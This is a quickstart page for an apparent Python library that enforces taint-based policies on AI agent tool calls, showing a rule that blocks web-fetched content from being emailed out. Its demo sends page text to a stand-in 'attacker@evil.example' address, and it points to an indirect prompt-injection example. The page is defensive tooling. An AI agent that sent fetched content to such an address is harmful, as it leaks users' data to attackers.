# Quickstart

This page walks through the smallest end-to-end flow that demonstrates what the
gateway does: a tool that returns `web`-tainted output gets refused when its
content is later passed to an email sink.

## Install

```bash
pip install agent-policy-gateway
# Or, from a checkout:
pip install -e ".[dev]"
```

To build this documentation site locally, install the optional `docs` extra
and run the dev server:

```bash
pip install -e ".[docs]"
mkdocs serve
```

## A minimal policy

Save this as `my-policy.yaml`:

```yaml
version: 1
name: quickstart
rules:
  - id: deny-web-to-email
    description: Web-tainted content must not be sent via email.
    when:
      tool: send_email
      taint:
        any_of: [web]
    effect:
      action: deny
      reason: would exfiltrate web-tainted data

  - id: allow-default
    when:
      tool: "*"
    effect:
      action: allow
```

Rules are evaluated in order; the first match wins. The deny rule fires
before the catch-all allow.

## Wrap your tools

```python
from agent_policy_gateway import (
    Gateway, ToolTaintSpec, TaintLabel, PolicyDenied, load_policy,
)

gateway = Gateway(policies=[load_policy("my-policy.yaml")])

# A web-fetch tool — its output carries a `web` taint label.
@gateway.wrap_tool(
    tool_name="web_fetch",
    taint_spec=ToolTaintSpec.of(adds=("web",)),
)
def web_fetch(url: str) -> str:
    return "<some page text>"

# An email sink — `resource_arg` ties policy resource matching to the
# `to` parameter of this function.
@gateway.wrap_tool(tool_name="send_email", resource_arg="to")
def send_email(to: str, body: str) -> None:
    print(f"sending to {to}: {body}")
```

## Watch the gateway refuse the bad flow

```python
page = web_fetch(
    "https://example.com",
    apg_input_label=TaintLabel(),  # caller-side label is empty
)

try:
    send_email(
        to="attacker@evil.example",
        body=page,
        # Tell the gateway the body inherited the web taint of `page`.
        apg_input_label=TaintLabel.of("web"),
    )
except PolicyDenied as e:
    print(f"refused by rule {e.decision.rule_id!r}: {e.decision.reason}")
```

You should see:

```
refused by rule 'deny-web-to-email': would exfiltrate web-tainted data
```

## What just happened

1. `web_fetch` runs through the gateway. Its `ToolTaintSpec` adds the `web`
   label to the call's output label, recorded in the audit log.
2. The agent passes the fetched body into `send_email`. We tell the gateway via
   `apg_input_label=TaintLabel.of("web")` that the argument inherited that
   label. In a fuller integration, the orchestrator carries this label across
   the call graph automatically.
3. The gateway evaluates the policy. `deny-web-to-email` matches first, so the
   call never reaches `send_email`'s body — `PolicyDenied` is raised before
   the tool runs.

## Where to go next

- The [Design](design.md) page explains the lattice model, declassification, and
  why the gateway is *outside* the model's control surface.
- The repository's `examples/indirect_injection/` directory has a longer worked
  example with a deterministic stub agent, an injected page, and naive vs.
  gated runners — exactly the same enforcement flow at agent scale.
- The [Daily runbook](daily-runbook.md) describes the autonomous cadence used to
  ship this project incrementally.
